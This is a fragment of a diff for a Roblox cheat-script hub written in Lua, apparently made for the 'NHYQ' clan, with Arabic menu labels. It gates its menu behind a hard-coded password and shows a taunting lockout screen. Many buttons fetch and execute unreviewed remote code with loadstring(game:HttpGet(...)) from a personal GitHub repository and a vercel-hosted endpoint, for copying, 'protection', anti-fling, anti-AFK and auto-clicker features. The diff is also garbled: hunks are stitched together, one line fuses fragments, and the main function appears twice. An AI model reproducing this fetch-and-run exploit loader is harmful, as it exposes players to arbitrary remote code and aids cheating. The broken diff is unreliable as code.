+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/chat"
+            ))()
+
+        end
+    )
+
+    SecCopy:NewButton(
+        "cmdbar2",
+        "تشغيل cmdbar2",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/NHYQ1"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- حماية
+    --==================================================
+
+    local TabProtect =
+        Window:NewTab("حماية")
+
+    local SecProtect =
+        TabProtect:NewSection("حماية")
 
     SecProtect:NewButton(
         "حماية",
@@ -1032,11 +1381,53 @@ local function LoadMainScript()
         end
     )
 
+    --==================================================
+    -- مضادات
+    --==================================================
+
+    local TabAnti =
+        Window:NewTab("مضادات")
+
+    local SecAnti =
+        TabAnti:NewSection("مضادات")
+
+    SecAnti:NewButton(
+        "مضاد بانق",
+        "تشغيل مضاد بانق",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/NHYQ1234"
+            ))()
+
+        end
+    )
+
+    SecAnti:NewButton(
+        "مضاد AFK",
+        "تشغيل مضاد AFK",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/AFK"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- LOGS
+    --==================================================
+
     local TabLogs =
-        Window:NewTab("لوق دخول و خروج الاعبين")
+        Window:NewTab(
+            "لوق دخول و خروج الاعبين"
+        )
 
     local SecLogs =
-        TabLogs:NewSection("لوق دخول و خروج الاعبين")
+        TabLogs:NewSection(
+            "لوق دخول و خروج الاعبين"
+        )
 
     SecLogs:NewButton(
         "لوق دخول و خروج الاعبين",
@@ -1050,8 +1441,15 @@ local function LoadMainScript()
         end
     )
 
-    local TabAuto = Window:NewTab("اوتو كلكر")
-    local SecAuto = TabAuto:NewSection("اوتو كلكر")
+    --==================================================
+    -- AUTO CLICKER
+    --==================================================
+
+    local TabAuto =
+        Window:NewTab("اوتو كلكر")
+
+    local SecAuto =
+        TabAuto:NewSection("اوتو كلكر")
 
     SecAuto:NewButton(
         "اوتو كلكر",
@@ -1064,6 +1462,10 @@ local function LoadMainScript()
 
         end
     )
+
+    --==================================================
+    -- LAG
+    --==================================================
 
     local TabLag =
         Window:NewTab("nvو ازالة الاق")
@@ -1095,11 +1497,19 @@ local function LoadMainScript()
         end
     )
 
+    --==================================================
+    -- OLD CLAN SCRIPT
+    --==================================================
+
     local TabOldClan =
-        Window:NewTab("السكربت القديم للكلان")
+        Window:NewTab(
+            "السكربت القديم للكلان"
+        )
 
     local SecOldClan =
-        TabOldClan:NewSection("السكربت القديم للكلان")
+        TabOldClan:NewSection(
+            "السكربت القديم للكلان"
+        )
 
     SecOldClan:NewButton(
         "السكربت القديم للكلان",
@@ -1124,6 +1534,10 @@ local function LoadMainScript()
     end)
 
 end
+
+--==================================================
+-- PASSWORD CHECK
+--==================================================
 
 local failedAttempts = 0
 local correctPassword = "NHYQONTOP1234"
@@ -1175,10 +1589,1080 @@ SubmitBtn.Activated:Connect(function()
 
     else
 
-        failedAttempts = failedAttempts + 1
+        failedAttempts =
+            failedAttempts + 1
+
         PassInput.Text = ""
 
-        local remaining = 3 - failedAttempts
+        local remaining =
+            3 - failedAttempts
+
+        if remaining > 0 then
+
+            PassInput.PlaceholderText =
+                "خطأ! محاولات متبقية: "
+                .. remaining
+
+        end
+
+        if failedAttempts >= 3 then
+
+            PasswordFrame.Visible = false
+            BanScreen.Visible = true
+
+        end
+
+    end
+
+end)tStroke.Parent = PassInput
+
+local SubmitBtn = Instance.new("TextButton")
+
+SubmitBtn.Size =
+    UDim2.new(0, 350, 0, 50)
+
+SubmitBtn.Position =
+    UDim2.new(0.5, -175, 0.73, 0)
+
+SubmitBtn.BackgroundColor3 =
+    Color3.fromRGB(255, 0, 0)
+
+SubmitBtn.BorderSizePixel = 0
+SubmitBtn.Text = "دخول"
+
+SubmitBtn.TextColor3 =
+    Color3.fromRGB(255, 255, 255)
+
+SubmitBtn.TextSize = 18
+SubmitBtn.Font = Enum.Font.GothamBold
+SubmitBtn.ZIndex = 101
+SubmitBtn.Parent = PasswordFrame
+
+local BtnCorner = Instance.new("UICorner")
+
+BtnCorner.CornerRadius =
+    UDim.new(0, 10)
+
+BtnCorner.Parent = SubmitBtn
+
+--==================================================
+-- PASSWORD DRAG
+--==================================================
+
+local PasswordDragging = false
+local PasswordDragStart
+local PasswordStartPos
+local PasswordDragInput
+
+PasswordFrame.InputBegan:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+        or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        PasswordDragging = true
+        PasswordDragStart = input.Position
+        PasswordStartPos =
+            PasswordFrame.Position
+
+        input.Changed:Connect(function()
+
+            if input.UserInputState ==
+                Enum.UserInputState.End then
+
+                PasswordDragging = false
+
+            end
+
+        end)
+
+    end
+
+end)
+
+PasswordFrame.InputChanged:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseMovement
+        or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        PasswordDragInput = input
+
+    end
+
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+
+    if PasswordDragging
+        and input == PasswordDragInput then
+
+        local delta =
+            input.Position - PasswordDragStart
+
+        PasswordFrame.Position =
+            UDim2.new(
+                PasswordStartPos.X.Scale,
+                PasswordStartPos.X.Offset + delta.X,
+                PasswordStartPos.Y.Scale,
+                PasswordStartPos.Y.Offset + delta.Y
+            )
+
+    end
+
+end)
+
+--==================================================
+-- BAN SCREEN
+--==================================================
+
+local BanScreen = Instance.new("Frame")
+
+BanScreen.Size =
+    UDim2.fromScale(1, 1)
+
+BanScreen.Position =
+    UDim2.fromScale(0, 0)
+
+BanScreen.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
+BanScreen.BorderSizePixel = 0
+BanScreen.Visible = false
+BanScreen.ZIndex = 2000
+BanScreen.Parent = ScreenGui
+
+local BanText = Instance.new("TextLabel")
+
+BanText.Size =
+    UDim2.fromScale(1, 1)
+
+BanText.BackgroundTransparency = 1
+BanText.Text = "خدلك يا حرامي 🖖"
+
+BanText.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
+BanText.TextSize = 50
+BanText.Font = Enum.Font.GothamBold
+BanText.ZIndex = 2001
+BanText.Parent = BanScreen
+
+--==================================================
+-- SUCCESS
+--==================================================
+
+local SuccessCheck = Instance.new("TextLabel")
+
+SuccessCheck.Size =
+    UDim2.fromScale(1, 1)
+
+SuccessCheck.Position =
+    UDim2.fromScale(0, 0)
+
+SuccessCheck.BackgroundTransparency = 1
+SuccessCheck.Text = "✔"
+
+SuccessCheck.TextColor3 =
+    Color3.fromRGB(0, 255, 0)
+
+SuccessCheck.TextSize = 100
+SuccessCheck.Font = Enum.Font.GothamBold
+SuccessCheck.Visible = false
+SuccessCheck.ZIndex = 1500
+SuccessCheck.Parent = ScreenGui
+
+--==================================================
+-- WELCOME
+--==================================================
+
+local WelcomeBanner = Instance.new("TextLabel")
+
+WelcomeBanner.Name = "WelcomeBanner"
+
+WelcomeBanner.Size =
+    UDim2.new(1, 0, 0, 65)
+
+WelcomeBanner.Position =
+    UDim2.new(0, 0, 0, -75)
+
+WelcomeBanner.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
+WelcomeBanner.BorderSizePixel = 0
+
+WelcomeBanner.Text =
+    "منور سكربت كلان NHYQ"
+
+WelcomeBanner.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
+WelcomeBanner.TextSize = 24
+WelcomeBanner.Font = Enum.Font.GothamBold
+
+WelcomeBanner.TextXAlignment =
+    Enum.TextXAlignment.Center
+
+WelcomeBanner.TextYAlignment =
+    Enum.TextYAlignment.Center
+
+WelcomeBanner.ZIndex = 1400
+WelcomeBanner.Parent = ScreenGui
+
+--==================================================
+-- INTRO TIMER
+--==================================================
+
+task.delay(3, function()
+
+    local fadeInfo = TweenInfo.new(0.5)
+
+    TweenService:Create(
+        IntroFrame,
+        fadeInfo,
+        {
+            BackgroundTransparency = 1
+        }
+    ):Play()
+
+    TweenService:Create(
+        IntroText,
+        fadeInfo,
+        {
+            TextTransparency = 1
+        }
+    ):Play()
+
+    TweenService:Create(
+        SubIntroText,
+        fadeInfo,
+        {
+            TextTransparency = 1
+        }
+    ):Play()
+
+    task.wait(0.5)
+
+    IntroFrame.Visible = false
+    PasswordFrame.Visible = true
+
+end)
+
+--==================================================
+-- NHYQ TOGGLE
+--==================================================
+
+local ToggleBtn = Instance.new("TextButton")
+
+ToggleBtn.Name = "NHYQToggle"
+
+ToggleBtn.Size =
+    UDim2.new(0, 65, 0, 65)
+
+ToggleBtn.Position =
+    UDim2.new(0, 30, 0, 30)
+
+ToggleBtn.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
+ToggleBtn.Text = "NHYQ"
+
+ToggleBtn.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
+ToggleBtn.TextSize = 18
+ToggleBtn.Font = Enum.Font.GothamBlack
+
+ToggleBtn.TextStrokeColor3 =
+    Color3.fromRGB(0, 0, 0)
+
+ToggleBtn.TextStrokeTransparency = 0
+ToggleBtn.Visible = false
+ToggleBtn.ZIndex = 5000
+ToggleBtn.AutoButtonColor = false
+ToggleBtn.Parent = ScreenGui
+
+local ToggleCorner = Instance.new("UICorner")
+
+ToggleCorner.CornerRadius =
+    UDim.new(1, 0)
+
+ToggleCorner.Parent = ToggleBtn
+
+local ToggleStroke = Instance.new("UIStroke")
+
+ToggleStroke.Color =
+    Color3.fromRGB(255, 0, 0)
+
+ToggleStroke.Thickness = 2
+ToggleStroke.Parent = ToggleBtn
+
+--==================================================
+-- TOGGLE DRAG
+--==================================================
+
+local btnDragging = false
+local btnDragStart
+local btnStartPos
+local moved = false
+
+ToggleBtn.InputBegan:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+        or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        btnDragging = true
+        moved = false
+        btnDragStart = input.Position
+        btnStartPos = ToggleBtn.Position
+
+        input.Changed:Connect(function()
+
+            if input.UserInputState ==
+                Enum.UserInputState.End then
+
+                btnDragging = false
+
+            end
+
+        end)
+
+    end
+
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+
+    if btnDragging then
+
+        if input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
+
+            local delta =
+                input.Position - btnDragStart
+
+            if delta.Magnitude > 6 then
+                moved = true
+            end
+
+            ToggleBtn.Position =
+                UDim2.new(
+                    btnStartPos.X.Scale,
+                    btnStartPos.X.Offset + delta.X,
+                    btnStartPos.Y.Scale,
+                    btnStartPos.Y.Offset + delta.Y
+                )
+
+        end
+
+    end
+
+end)
+
+--==================================================
+-- KAVO
+--==================================================
+
+local KavoGui = nil
+local KavoVisible = true
+local KavoCreatedGuis = {}
+
+local function LooksLikeKavo(gui)
+
+    if not gui or gui == ScreenGui then
+        return false
+    end
+
+    if gui.Name == "KavoUI" then
+        return true
+    end
+
+    local name =
+        string.lower(gui.Name)
+
+    if string.find(name, "kavo") then
+        return true
+    end
+
+    local foundTitle = false
+
+    pcall(function()
+
+        for _, obj in ipairs(gui:GetDescendants()) do
+
+            if obj:IsA("TextLabel")
+            or obj:IsA("TextButton")
+            or obj:IsA("TextBox") then
+
+                local txt =
+                    tostring(obj.Text or "")
+
+                if string.find(
+                    txt,
+                    "سكربت كلان NHYQ"
+                )
+                or string.find(
+                    string.lower(txt),
+                    "kavo"
+                ) then
+
+                    foundTitle = true
+                    break
+
+                end
+
+            end
+
+        end
+
+    end)
+
+    return foundTitle
+end
+
+local function FindKavoGui()
+
+    for _, gui in ipairs(KavoCreatedGuis) do
+
+        if gui and gui.Parent then
+            return gui
+        end
+
+    end
+
+    for _, gui in ipairs(CoreGui:GetChildren()) do
+
+        if gui:IsA("ScreenGui")
+        and LooksLikeKavo(gui) then
+
+            return gui
+
+        end
+
+    end
+
+    local PlayerGui =
+        Player:FindFirstChildOfClass("PlayerGui")
+
+    if PlayerGui then
+
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+
+            if gui:IsA("ScreenGui")
+            and LooksLikeKavo(gui) then
+
+                return gui
+
+            end
+
+        end
+
+    end
+
+    return nil
+end
+
+local function SetKavoVisibility(state)
+
+    if not KavoGui
+        or not KavoGui.Parent then
+
+        KavoGui = FindKavoGui()
+
+    end
+
+    if not KavoGui then
+        return false
+    end
+
+    KavoVisible = state
+
+    if KavoGui:IsA("ScreenGui") then
+
+        KavoGui.Enabled = state
+        return true
+
+    elseif KavoGui:IsA("GuiObject") then
+
+        KavoGui.Visible = state
+        return true
+
+    end
+
+    return false
+end
+
+ToggleBtn.Activated:Connect(function()
+
+    if moved then
+        moved = false
+        return
+    end
+
+    if not KavoGui
+        or not KavoGui.Parent then
+
+        KavoGui = FindKavoGui()
+
+    end
+
+    if not KavoGui then
+        return
+    end
+
+    SetKavoVisibility(
+        not KavoVisible
+    )
+
+end)
+
+--==================================================
+-- KAVO DRAG
+--==================================================
+
+local function MakeKavoDraggable(gui)
+
+    if not gui then
+        return
+    end
+
+    local MainFrame = nil
+    local largestArea = 0
+
+    pcall(function()
+
+        for _, obj in ipairs(gui:GetDescendants()) do
+
+            if obj:IsA("Frame")
+            and obj.Visible then
+
+                local size = obj.AbsoluteSize
+                local area = size.X * size.Y
+
+                if area > largestArea
+                and size.X > 200
+                and size.Y > 100 then
+
+                    largestArea = area
+                    MainFrame = obj
+
+                end
+
+            end
+
+        end
+
+    end)
+
+    if not MainFrame then
+        return
+    end
+
+    if MainFrame:GetAttribute(
+        "NHYQ_Draggable"
+    ) then
+
+        return
+    end
+
+    MainFrame:SetAttribute(
+        "NHYQ_Draggable",
+        true
+    )
+
+    local Dragging = false
+    local DragStart
+    local StartPosition
+
+    MainFrame.InputBegan:Connect(function(input)
+
+        if input.UserInputType ==
+            Enum.UserInputType.MouseButton1
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
+
+            Dragging = true
+            DragStart = input.Position
+            StartPosition = MainFrame.Position
+
+            input.Changed:Connect(function()
+
+                if input.UserInputState ==
+                    Enum.UserInputState.End then
+
+                    Dragging = false
+
+                end
+
+            end)
+
+        end
+
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+
+        if not Dragging then
+            return
+        end
+
+        if input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
+
+            local Delta =
+                input.Position - DragStart
+
+            MainFrame.Position =
+                UDim2.new(
+                    StartPosition.X.Scale,
+                    StartPosition.X.Offset + Delta.X,
+                    StartPosition.Y.Scale,
+                    StartPosition.Y.Offset + Delta.Y
+                )
+
+        end
+
+    end)
+
+end
+
+--==================================================
+-- LOAD MAIN SCRIPT
+--==================================================
+
+local function LoadMainScript()
+
+    local BeforeCore = {}
+
+    for _, gui in ipairs(CoreGui:GetChildren()) do
+
+        if gui:IsA("ScreenGui") then
+            BeforeCore[gui] = true
+        end
+
+    end
+
+    local PlayerGui =
+        Player:FindFirstChildOfClass("PlayerGui")
+
+    local BeforePlayer = {}
+
+    if PlayerGui then
+
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+
+            if gui:IsA("ScreenGui") then
+                BeforePlayer[gui] = true
+            end
+
+        end
+
+    end
+
+    local Library = loadstring(
+        game:HttpGet(
+            "https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"
+        )
+    )()
+
+    local Window =
+        Library.CreateLib(
+            "سكربت كلان NHYQ",
+            "BloodTheme"
+        )
+
+    task.wait(0.5)
+
+    for _, gui in ipairs(CoreGui:GetChildren()) do
+
+        if gui:IsA("ScreenGui")
+        and not BeforeCore[gui]
+        and gui ~= ScreenGui then
+
+            table.insert(
+                KavoCreatedGuis,
+                gui
+            )
+
+        end
+
+    end
+
+    PlayerGui =
+        Player:FindFirstChildOfClass(
+            "PlayerGui"
+        )
+
+    if PlayerGui then
+
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+
+            if gui:IsA("ScreenGui")
+            and not BeforePlayer[gui]
+            and gui ~= ScreenGui then
+
+                table.insert(
+                    KavoCreatedGuis,
+                    gui
+                )
+
+            end
+
+        end
+
+    end
+
+    KavoGui = FindKavoGui()
+
+    if KavoGui then
+
+        KavoVisible = true
+
+        task.delay(0.5, function()
+            MakeKavoDraggable(KavoGui)
+        end)
+
+    end
+
+    --==================================================
+    -- نسخ
+    --==================================================
+
+    local TabCopy =
+        Window:NewTab("نسخ")
+
+    local SecCopy =
+        TabCopy:NewSection("نسخ تلقائي")
+
+    SecCopy:NewButton(
+        "نسخ تلقائي",
+        "نسخ تلقائي",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ui"
+            ))()
+
+        end
+    )
+
+    SecCopy:NewButton(
+        "نسخ شات",
+        "تشغيل نسخ الشات",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/nhyqq"
+            ))()
+
+        end
+    )
+
+    SecCopy:NewButton(
+        "ماب نسخ",
+        "تشغيل ماب نسخ",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/chat"
+            ))()
+
+        end
+    )
+
+    SecCopy:NewButton(
+        "cmdbar2",
+        "تشغيل cmdbar2",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/NHYQ1"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- حماية
+    --==================================================
+
+    local TabProtect =
+        Window:NewTab("حماية")
+
+    local SecProtect =
+        TabProtect:NewSection("حماية")
+
+    SecProtect:NewButton(
+        "حماية",
+        "حماية",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_hh"
+            ))()
+
+        end
+    )
+
+    SecProtect:NewButton(
+        "حماية فلنق",
+        "حماية فلنق",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_bn"
+            ))()
+
+        end
+    )
+
+    SecProtect:NewButton(
+        "حمايةice",
+        "حمايةice",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_jh"
+            ))()
+
+        end
+    )
+
+    SecProtect:NewButton(
+        "حمايةchar,title,dog",
+        "حمايةchar,title,dog",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_sh"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- مضادات
+    --==================================================
+
+    local TabAnti =
+        Window:NewTab("مضادات")
+
+    local SecAnti =
+        TabAnti:NewSection("مضادات")
+
+    SecAnti:NewButton(
+        "مضاد بانق",
+        "تشغيل مضاد بانق",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/NHYQ1234"
+            ))()
+
+        end
+    )
+
+    SecAnti:NewButton(
+        "مضاد AFK",
+        "تشغيل مضاد AFK",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/AFK"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- LOGS
+    --==================================================
+
+    local TabLogs =
+        Window:NewTab(
+            "لوق دخول و خروج الاعبين"
+        )
+
+    local SecLogs =
+        TabLogs:NewSection(
+            "لوق دخول و خروج الاعبين"
+        )
+
+    SecLogs:NewButton(
+        "لوق دخول و خروج الاعبين",
+        "لوق دخول و خروج الاعبين",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_gh"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- AUTO CLICKER
+    --==================================================
+
+    local TabAuto =
+        Window:NewTab("اوتو كلكر")
+
+    local SecAuto =
+        TabAuto:NewSection("اوتو كلكر")
+
+    SecAuto:NewButton(
+        "اوتو كلكر",
+        "اوتو كلكر",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ah"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- LAG
+    --==================================================
+
+    local TabLag =
+        Window:NewTab("nvو ازالة الاق")
+
+    local SecLag =
+        TabLag:NewSection("nvو ازالة الاق")
+
+    SecLag:NewButton(
+        "nv",
+        "nv",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_nv"
+            ))()
+
+        end
+    )
+
+    SecLag:NewButton(
+        "ازالة الاق",
+        "ازالة الاق",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_jk"
+            ))()
+
+        end
+    )
+
+    --==================================================
+    -- OLD CLAN SCRIPT
+    --==================================================
+
+    local TabOldClan =
+        Window:NewTab(
+            "السكربت القديم للكلان"
+        )
+
+    local SecOldClan =
+        TabOldClan:NewSection(
+            "السكربت القديم للكلان"
+        )
+
+    SecOldClan:NewButton(
+        "السكربت القديم للكلان",
+        "تشغيل السكربت القديم للكلان",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_shshs"
+            ))()
+
+        end
+    )
+
+    task.delay(1, function()
+
+        KavoGui = FindKavoGui()
+
+        if KavoGui then
+            MakeKavoDraggable(KavoGui)
+        end
+
+    end)
+
+end
+
+--==================================================
+-- PASSWORD CHECK
+--==================================================
+
+local failedAttempts = 0
+local correctPassword = "NHYQONTOP1234"
+
+SubmitBtn.Activated:Connect(function()
+
+    if PassInput.Text == correctPassword then
+
+        PasswordFrame.Visible = false
+        SuccessCheck.Visible = true
+
+        task.wait(1.5)
+
+        SuccessCheck.Visible = false
+        ToggleBtn.Visible = true
+
+        WelcomeBanner.Position =
+            UDim2.new(0, 0, 0, -75)
+
+        TweenService:Create(
+            WelcomeBanner,
+            TweenInfo.new(
+                0.5,
+                Enum.EasingStyle.Quart,
+                Enum.EasingDirection.Out
+            ),
+            {
+                Position =
+                    UDim2.new(0, 0, 0, 0)
+            }
+        ):Play()
+
+        LoadMainScript()
+
+        task.wait(5)
+
+        TweenService:Create(
+            WelcomeBanner,
+            TweenInfo.new(
+                0.5,
+                Enum.EasingStyle.Quart,
+                Enum.EasingDirection.In
+            ),
+            {
+                Position =
+                    UDim2.new(0, 0, 0, -75)
+            }
+        ):Play()
+
+    else
+
+        failedAttempts =
+            failedAttempts + 1
+
+        PassInput.Text = ""
+
+        local remaining =
+            3 - failedAttempts
 
         if remaining > 0 then
 
